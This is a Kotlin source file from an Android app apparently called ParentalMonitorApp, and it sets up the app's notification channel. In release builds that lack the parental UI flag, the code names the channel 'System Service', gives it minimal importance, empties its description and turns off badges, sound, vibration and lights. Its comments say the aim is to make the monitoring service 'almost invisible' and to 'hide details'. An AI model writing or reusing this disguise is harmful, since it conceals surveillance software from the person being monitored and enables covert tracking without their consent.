package com.redeye.parentalmonitor

import android.app.Application
import android.app.NotificationChannel
import android.app.NotificationManager
import android.os.Build

class ParentalMonitorApp : Application() {

    companion object {
        const val CHANNEL_ID = "monitoring_channel"
        const val CHANNEL_NAME = "Monitoring Service"
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val parental = BuildConfig.PARENTAL_UI
            val importance = if (BuildConfig.DEBUG || parental) {
                NotificationManager.IMPORTANCE_LOW
            } else {
                NotificationManager.IMPORTANCE_MIN // Minimal - almost invisible
            }

            // Channel name CANNOT be empty - Android requirement
            val channelName = if (parental) {
                "Parental Control"
            } else if (BuildConfig.DEBUG) {
                CHANNEL_NAME
            } else {
                "System Service" // Minimal generic name for release
            }
            
            val channel = NotificationChannel(
                CHANNEL_ID,
                channelName,
                importance
            ).apply {
                description = "" // Always empty to hide details
                setShowBadge(false)
                setSound(null, null)
                enableVibration(false)
                enableLights(false)
            }

            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }
}

